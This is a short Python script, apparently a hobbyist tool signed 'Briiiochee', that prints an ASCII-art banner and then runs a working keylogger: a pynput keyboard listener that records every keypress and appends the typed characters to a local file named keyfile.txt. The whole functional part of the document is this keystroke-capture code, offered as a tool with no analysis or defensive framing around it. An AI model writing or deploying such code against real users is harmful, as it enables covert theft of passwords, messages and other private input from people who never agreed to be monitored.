# pip install pynput

from termcolor import colored
import tldextract

print(colored("""
_______    .-------.     .-./`)  .-./`)  .-./`)      ,-----.         _______    .---.  .---.      .-''-.       .-''-.   
\  ____  \  |  _ _   \    \ .-.') \ .-.') \ .-.')   .'  .-,  '.      /   __  \   |   |  |_ _|    .'_ _   \    .'_ _   \  
| |    \ |  | ( ' )  |    / `-' \ / `-' \ / `-' \  / ,-.|  \ _ \    | ,_/  \__)  |   |  ( ' )   / ( ` )   '  / ( ` )   ' 
| |____/ /  |(_ o _) /     `-'`"`  `-'`"`  `-'`"` ;  \  '_ /  | : ,-./  )        |   '-(_{;}_) . (_ o _)  | . (_ o _)  | 
|   _ _ '.  | (_,_).' __   .---.   .---.   .---.  |  _`,/ \ _/  | \  '_ '`)      |      (_,_)  |  (_,_)___| |  (_,_)___| 
|  ( ' )  \ |  |\ \  |  |  |   |   |   |   |   |  : (  '\_/ \   ;  > (_)  )  __  | _ _--.   |  '  \   .---. '  \   .---. 
| (_{;}_) | |  | \ `'   /  |   |   |   |   |   |   \ `"/  \  ) /  (  .  .-'_/  ) |( ' ) |   |   \  `-'    /  \  `-'    / 
|  (_,_)  / |  |  \    /   |   |   |   |   |   |    '. \_/``".'    `-'`-'     /  (_{;}_)|   |    \       /    \       /  
/_______.'  ''-'   `'-'    '---'   '---'   '---'      '-----'        `._____.'   '(_,_) '---'     `'-..-'      `'-..-'   
                                                                                                                         """, 'red'))
print(colored('Created-by-Briiiochee\n\n', 'cyan'))


from numpy import char
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:

            if key == keyboard.Key.space:
                logKey.write('\n')
            else:
                print("Error getting char")
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()